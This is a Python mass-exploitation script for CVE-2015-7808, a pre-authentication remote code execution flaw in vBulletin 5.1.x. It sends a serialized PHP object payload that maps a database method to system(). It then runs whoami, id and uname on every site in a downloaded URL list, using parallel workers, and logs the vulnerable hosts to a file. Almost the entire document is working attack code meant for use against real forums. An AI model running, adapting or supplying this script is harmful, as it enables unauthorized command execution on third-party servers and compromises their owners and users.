# Exploit Title             : [Exploit] vBulletin 5.1.x - PreAuth Remote Code Execution
# Date                      : 11-09-2015
# Requirements              : Python 3.4.x , Requests, Colorama
# Tested on                 : Windows 8.1 / Ubuntu 14.04
# CVE                       : CVE-2015-7808
# Blog Post                 : http://mukarramkhalid.com/exploit-vbulletin-5-1-x-preauth-remote-code-execution/
# Url list                  : http://makman.tk/vb/urls.txt

import  requests, re, sys
import  colorama
from    colorama        import *
from    urllib.parse    import urlparse
from    time            import time as timer
from    functools       import partial
from    multiprocessing import Pool

colorama.init()

def banner():
    print( '\n' )
    print( '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' )
    print( '                  [Mass Exploit] VBulletin 5.1.x                    ' )
    print( '    MakMan -- http://mukarramkhalid.com -- http://fb.com/makmaniac  ' )
    print( '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' )
    print( '\n' )

def inject( u ):
    # Formatting URL
    if      '/forum/' in u:
        url     = u.split( '/forum' )[0] + '/forum/ajax/api/hook/decodeArguments'
        turl    = url[:-36]
    elif    '/Forum/' in u:
        url     = u.split( '/Forum' )[0] + '/Forum/ajax/api/hook/decodeArguments'
        turl    = url[:-36]
    else:
        o       = urlparse( u )
        url     = o.scheme + '://' + o.netloc + '/ajax/api/hook/decodeArguments'
        turl    = url[:-30]
    try:
        r       = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:11:"echo makman";}', timeout= 15 )
        if 'makman' in r.text and len( r.text ) < 50:
            r   = requests.get( url, params = 'arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:36:"whoami;echo :::;id;echo :::;uname -a";}', timeout= 15 )
            if len( r.text ) < 200:
                print( Fore.RED + ' [+] URL : ' + Fore.GREEN + ' ' + turl )
                print( '    ' + Fore.YELLOW + ' [+] WHOAMI  : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[0].strip() )
                print( '    ' + Fore.YELLOW + ' [+] ID      : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[1].strip() )
                print( '    ' + Fore.YELLOW + ' [+] UNAME   : ' + Fore.CYAN + ' ' + r.text.split( ':::' )[2].strip() + '\n' )
                sys.stdout.flush()
                return url + ':::' + r.text
            else:
                return url + ':::' + 'Not Vulnerable'
        else:
            return url + ':::' + 'Not Vulnerable'
    except:
        return url + ':::' + 'Bad Response'

def main():
    print (Style.BRIGHT)
    banner()
    count        = 0
    start        = timer()
    file_string  = ''
    final_result = []
    # Make sure urls.txt is in the same directory
    try:
        with open( 'urls.txt' ) as f:
            search_result = f.read().splitlines()
    except:
        print( 'urls.txt not found in the current directory. Create your own or download from here. http://makman.tk/vb/urls.txt\n' )
        sys.exit(0)
    search_result = list( set( search_result ) )
    print (' [+] Executing Exploit for ' + Fore.RED + str( len( search_result ) ) + Fore.WHITE + ' Urls.\n')
    with Pool(8) as p:
        final_result.extend( p.map( inject, search_result ) )
    for i in final_result:
        if not 'Not Vulnerable' in i and not 'Bad Response' in i:
            count += 1
            file_string = file_string + i.split( ':::' )[0].strip() + '\n' + i.split( ':::' )[1].strip() + '\n' + i.split( ':::' )[2].strip() + '\n' + i.split( ':::' )[3].strip()
            file_string = file_string + '\n------------------------------------------\n'
    # Writing Result in a file makman.txt
    with open( 'makman.txt', 'a', encoding = 'utf-8' ) as rfile:
        rfile.write( file_string )
    print( 'Total URLs Scanned    : ' + str( len( search_result ) ) )
    print( 'Vulnerable URLs Found : ' + str( count ) )
    print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )

if __name__ == '__main__':
    main()

#End
